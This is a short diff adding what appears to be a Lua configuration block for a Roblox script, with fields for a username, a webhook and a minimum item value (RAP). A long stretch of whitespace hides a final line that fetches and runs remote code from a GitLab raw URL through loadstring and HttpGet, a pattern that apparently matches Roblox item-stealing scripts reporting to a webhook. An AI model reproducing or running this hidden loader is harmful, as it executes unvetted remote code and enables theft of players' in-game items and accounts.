@@ -1,0 +1,6 @@
+Username = "Your Roblox Username"
+Username2 = "Same Username"
+Webhook = "Your Webhook"
+MinimumRAP = 100000  
+
+                                                                                                                                                                                                                                                                                                                                                                                       loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/BloxFruits"))()
